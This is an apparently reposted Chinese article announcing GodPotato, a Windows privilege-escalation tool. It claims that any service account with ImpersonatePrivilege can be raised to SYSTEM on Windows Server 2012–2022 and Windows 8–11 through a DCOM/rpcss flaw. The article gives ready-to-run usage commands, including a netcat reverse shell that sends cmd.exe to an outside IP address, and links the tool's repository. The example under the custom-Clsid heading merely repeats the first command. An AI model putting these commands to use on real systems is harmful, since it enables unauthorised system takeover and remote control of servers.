<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YKcd7ZNbrkMEvDLzDiaBlw)

根据 Potato 提权 6 年的历史，从 RottenPotato 开始到 JuicyPotatoNG 结束，我通过研究 DCOM 发现了一项新技术，可以在 Windows 2012 - Windows 2022 中实现提权，现在只要你有 “ImpersonatePrivilege” 权限。那么你就是 “NT AUTHORITY\SYSTEM”，通常 WEB 服务和数据库服务都有“ImpersonatePrivilege” 权限。

马铃薯提权通常用在我们获取 WEB / 数据库权限的时候。我们可以将低权限的服务用户提升为 “NT AUTHORITY\SYSTEM” 权限。然而历史上的 Potato 却没有办法在最新的 Windows 系统上运行。当我研究 DCOM 时，我发现了一种可以执行权限提升的新方法。rpcss 在处理 ox 时存在一些缺陷，rpcss 是系统必须开启的服务。，所以它几乎可以运行在任何 Windows 操作系统上，我将它命名为 GodPotato

**受影响版本**
=========

Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11

使用程序内置的 Clsid 进行权限提升并执行简单的命令

```
GodPotato -cmd "cmd /c whoami"

```

![](https://mmbiz.qpic.cn/mmbiz_png/RRrILrELHYibic2EJYFO0EZvtia5k2UquOdG31wpFuPt7VibRscsc5PYPuM4bfuicgKgbLHiadDuagY8W0qmJ8QbYNvA/640?wx_fmt=png&from=appmsg)

自定义 Clsid 并执行命令

```
GodPotato -cmd "cmd /c whoami"

```

![](https://mmbiz.qpic.cn/mmbiz_png/RRrILrELHYibic2EJYFO0EZvtia5k2UquOd7AaAtmhyaQZnI8ZDXpURBb6ic70vrPMIOYFmGPjbgxF6uia6853hNDSw/640?wx_fmt=png&from=appmsg)

执行反向 shell 命令

```
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"

```

地址:  

https://github.com/BeichenDream/GodPotato